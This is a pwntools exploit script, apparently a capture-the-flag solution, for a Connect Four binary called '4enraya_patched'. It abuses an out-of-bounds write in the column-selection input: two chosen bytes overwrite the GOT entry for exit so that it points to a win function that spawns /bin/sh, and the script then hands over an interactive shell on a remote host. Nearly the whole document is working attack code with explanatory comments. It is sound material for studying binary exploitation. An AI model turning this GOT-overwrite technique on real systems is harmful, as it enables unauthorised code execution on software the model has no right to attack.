#!/usr/bin/env python3

from pwn import *

e = ELF("./4enraya_patched")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "10.10.10.10"  # Remote host IP
PORT = 1337  # Remote port

gdb_script = """
b main
b print_board
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p = conn()  # Establish connection to target

    # The program contains an out-of-bounds (OOB) vulnerability in the option
    # that lets the user select the column where a character will be stored,
    # and the user also controls the character value.
    # The objective is to overwrite the GOT entry for exit so that it points
    # to the win function, which will spawn a /bin/sh.

    board = e.sym["board"]
    exit_got_addr = e.got["exit"]

    player1 = b"\x5d"
    player1_pos = exit_got_addr - board + 0x30
    # 0x4030a0 (exit_got_value) -> 0x40305d

    player2 = b"\x33"
    player2_pos = (exit_got_addr + 1) - board + 0x30
    # 0x40305d -> 0x40335d (win_addr)

    # Now exit.got = win

    # Why +0x30?
    # The program reads a character with getchar(), so it returns the ASCII code.
    # Subtract 0x30 (ASCII '0') to convert an ASCII digit to its numeric value.
    # Example: if the user types '5', getchar() returns 0x35 ('5').
    # 0x35 - 0x30 = 0x05 => numeric value 5.

    # column = getchar();
    # getchar();
    # column = (char)column + -0x30;

    p.sendlineafter("Enter player 1 symbol > ", player1)
    p.sendlineafter("Enter player 2 symbol > ", player2)
    p.sendlineafter("Player 1 choose your column (0-7) > ", chr(player1_pos).encode())
    p.sendlineafter("tecla para continuar: ", b"")
    p.sendlineafter("Player 2 choose your column (0-7) > ", chr(player2_pos).encode())
    p.sendlineafter("tecla para continuar: ", b"e")
    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

